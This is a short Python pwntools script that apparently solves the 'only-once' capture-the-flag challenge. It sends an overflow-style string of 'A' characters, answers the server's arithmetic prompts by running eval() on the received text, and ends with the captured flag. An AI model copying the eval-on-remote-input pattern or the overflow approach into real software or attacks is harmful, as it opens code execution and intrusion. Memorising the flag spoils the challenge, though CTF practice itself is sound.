from pwn import *
import re
import time
# for context
context.log_level = 'debug'
# for remote
host = 'only-once-pwn.wanictf.org'
port = 9002 
io = None
# for local
# exe = context.binary = ELF("./challenge/share/chall")
# libc = ELF("./solution/libc.so.6")

def start():
    if not args.R:
        return process([exe.path])
    else:
        return remote(host, port)
def exploit(io):
    flag = 0
    io.sendline('AAAAAAAAAAAAAA')
    for i in range(500):
        time.sleep(0.3)
        if flag == 1: 
            break
        received_data = io.recvregex(b'(\d)+ \+ (\d)+ = ').decode('utf-8')
        if ' your score: 2' in received_data:
            flag = 1
        received_data = received_data.split('\n')
        r = received_data[len(received_data) - 1]
        print('recv:', r)
        e = r.replace(' = ', '')
        s = eval(str(e))
        io.sendline(str(s))
    io.interactive()

io = start()
exploit(io)

# FLAG{y0u_4r3_600d_47_c41cu14710n5!}
